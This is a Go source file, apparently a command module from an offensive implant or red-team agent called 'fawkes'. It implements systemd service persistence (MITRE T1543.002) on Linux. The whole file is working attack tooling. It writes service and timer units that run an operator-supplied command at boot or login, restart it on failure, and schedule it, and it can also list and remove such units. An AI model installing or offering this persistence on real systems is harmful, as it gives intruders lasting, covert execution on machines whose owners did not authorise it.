//go:build linux
// +build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type SystemdPersistCommand struct{}

func (c *SystemdPersistCommand) Name() string { return "systemd-persist" }
func (c *SystemdPersistCommand) Description() string {
	return "Install, remove, or list systemd service persistence (T1543.002)"
}

type systemdPersistArgs struct {
	Action      string `json:"action"`
	Name        string `json:"name"`
	ExecStart   string `json:"exec_start"`
	Description string `json:"description"`
	System      bool   `json:"system"`
	RestartSec  int    `json:"restart_sec"`
	Timer       string `json:"timer"`
}

func (c *SystemdPersistCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: install, remove, list",
			Status:    "error",
			Completed: true,
		}
	}

	var args systemdPersistArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "install":
		return systemdInstall(args)
	case "remove":
		return systemdRemove(args)
	case "list":
		return systemdList(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: install, remove, list", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// systemdUnitDir returns the appropriate systemd unit directory
func systemdUnitDir(system bool) (string, error) {
	if system {
		return "/etc/systemd/system", nil
	}
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("cannot determine user: %v", err)
	}
	dir := filepath.Join(u.HomeDir, ".config", "systemd", "user")
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("cannot create user unit dir: %v", err)
	}
	return dir, nil
}

func systemdInstall(args systemdPersistArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output: "Error: name parameter required (unit name without .service suffix)",
			Status: "error", Completed: true,
		}
	}
	if args.ExecStart == "" {
		return structs.CommandResult{
			Output: "Error: exec_start parameter required (command to execute)",
			Status: "error", Completed: true,
		}
	}

	unitDir, err := systemdUnitDir(args.System)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error: %v", err),
			Status: "error", Completed: true,
		}
	}

	desc := args.Description
	if desc == "" {
		desc = args.Name + " service"
	}

	restartSec := args.RestartSec
	if restartSec < 1 {
		restartSec = 10
	}

	// Build service unit file
	var sb strings.Builder
	sb.WriteString("[Unit]\n")
	sb.WriteString(fmt.Sprintf("Description=%s\n", desc))
	if args.System {
		sb.WriteString("After=network.target\n")
	}
	sb.WriteString("\n[Service]\n")
	sb.WriteString("Type=simple\n")
	sb.WriteString(fmt.Sprintf("ExecStart=%s\n", args.ExecStart))
	sb.WriteString("Restart=on-failure\n")
	sb.WriteString(fmt.Sprintf("RestartSec=%d\n", restartSec))
	sb.WriteString("\n[Install]\n")
	if args.System {
		sb.WriteString("WantedBy=multi-user.target\n")
	} else {
		sb.WriteString("WantedBy=default.target\n")
	}

	servicePath := filepath.Join(unitDir, args.Name+".service")
	if err := os.WriteFile(servicePath, []byte(sb.String()), 0644); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing unit file: %v", err),
			Status: "error", Completed: true,
		}
	}

	var output strings.Builder
	output.WriteString("Systemd service installed:\n")
	output.WriteString(fmt.Sprintf("  Name:      %s.service\n", args.Name))
	output.WriteString(fmt.Sprintf("  Path:      %s\n", servicePath))
	output.WriteString(fmt.Sprintf("  ExecStart: %s\n", args.ExecStart))
	output.WriteString(fmt.Sprintf("  Restart:   on-failure (every %ds)\n", restartSec))
	if args.System {
		output.WriteString("  Scope:     system (requires root)\n")
	} else {
		output.WriteString("  Scope:     user\n")
	}

	// If timer is specified, also create a timer unit
	if args.Timer != "" {
		var timerSb strings.Builder
		timerSb.WriteString("[Unit]\n")
		timerSb.WriteString(fmt.Sprintf("Description=Timer for %s\n", desc))
		timerSb.WriteString("\n[Timer]\n")
		timerSb.WriteString(fmt.Sprintf("OnCalendar=%s\n", args.Timer))
		timerSb.WriteString("Persistent=true\n")
		timerSb.WriteString("\n[Install]\n")
		if args.System {
			timerSb.WriteString("WantedBy=timers.target\n")
		} else {
			timerSb.WriteString("WantedBy=timers.target\n")
		}

		timerPath := filepath.Join(unitDir, args.Name+".timer")
		if err := os.WriteFile(timerPath, []byte(timerSb.String()), 0644); err != nil {
			output.WriteString(fmt.Sprintf("\nWarning: failed to write timer file: %v\n", err))
		} else {
			output.WriteString(fmt.Sprintf("  Timer:     %s (%s)\n", timerPath, args.Timer))
		}
	}

	output.WriteString("\nTo activate, run: systemctl ")
	if !args.System {
		output.WriteString("--user ")
	}
	output.WriteString(fmt.Sprintf("enable --now %s.service", args.Name))
	if args.Timer != "" {
		output.WriteString("\nFor timer: systemctl ")
		if !args.System {
			output.WriteString("--user ")
		}
		output.WriteString(fmt.Sprintf("enable --now %s.timer", args.Name))
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "success",
		Completed: true,
	}
}

func systemdRemove(args systemdPersistArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output: "Error: name parameter required",
			Status: "error", Completed: true,
		}
	}

	unitDir, err := systemdUnitDir(args.System)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error: %v", err),
			Status: "error", Completed: true,
		}
	}

	var sb strings.Builder
	errors := 0

	servicePath := filepath.Join(unitDir, args.Name+".service")
	if err := os.Remove(servicePath); err != nil {
		if os.IsNotExist(err) {
			sb.WriteString(fmt.Sprintf("Service file not found: %s\n", servicePath))
		} else {
			sb.WriteString(fmt.Sprintf("Error removing service: %v\n", err))
			errors++
		}
	} else {
		sb.WriteString(fmt.Sprintf("Removed: %s\n", servicePath))
	}

	// Also try to remove timer if it exists
	timerPath := filepath.Join(unitDir, args.Name+".timer")
	if err := os.Remove(timerPath); err == nil {
		sb.WriteString(fmt.Sprintf("Removed: %s\n", timerPath))
	}

	sb.WriteString("\nTo complete cleanup, run: systemctl ")
	if !args.System {
		sb.WriteString("--user ")
	}
	sb.WriteString(fmt.Sprintf("disable --now %s.service && systemctl ", args.Name))
	if !args.System {
		sb.WriteString("--user ")
	}
	sb.WriteString("daemon-reload")

	status := "success"
	if errors > 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func systemdList(args systemdPersistArgs) structs.CommandResult {
	var sb strings.Builder

	// Check user units
	u, err := user.Current()
	if err == nil {
		userDir := filepath.Join(u.HomeDir, ".config", "systemd", "user")
		sb.WriteString("User Services (~/.config/systemd/user/)\n")
		sb.WriteString(strings.Repeat("=", 60) + "\n")
		listUnits(&sb, userDir)
	}

	// Check system units
	sb.WriteString("\nSystem Services (/etc/systemd/system/)\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	listUnits(&sb, "/etc/systemd/system")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func listUnits(sb *strings.Builder, dir string) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		if os.IsNotExist(err) {
			sb.WriteString("  (directory does not exist)\n")
		} else {
			sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
		}
		return
	}

	count := 0
	for _, entry := range entries {
		name := entry.Name()
		if !strings.HasSuffix(name, ".service") && !strings.HasSuffix(name, ".timer") {
			continue
		}
		// Skip symlinks to /dev/null (masked units) and wants directories
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if info.Mode()&os.ModeSymlink != 0 {
			target, err := os.Readlink(filepath.Join(dir, name))
			if err == nil && target == "/dev/null" {
				continue
			}
		}

		content, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			sb.WriteString(fmt.Sprintf("  [%d] %s (unreadable)\n", count+1, name))
			count++
			continue
		}

		// Extract key fields
		desc := extractField(string(content), "Description=")
		execStart := extractField(string(content), "ExecStart=")
		onCalendar := extractField(string(content), "OnCalendar=")

		sb.WriteString(fmt.Sprintf("  [%d] %s\n", count+1, name))
		if desc != "" {
			sb.WriteString(fmt.Sprintf("      Description: %s\n", desc))
		}
		if execStart != "" {
			sb.WriteString(fmt.Sprintf("      ExecStart:   %s\n", execStart))
		}
		if onCalendar != "" {
			sb.WriteString(fmt.Sprintf("      OnCalendar:  %s\n", onCalendar))
		}
		count++
	}

	if count == 0 {
		sb.WriteString("  (none)\n")
	}
}

func extractField(content, prefix string) string {
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, prefix) {
			return strings.TrimPrefix(line, prefix)
		}
	}
	return ""
}
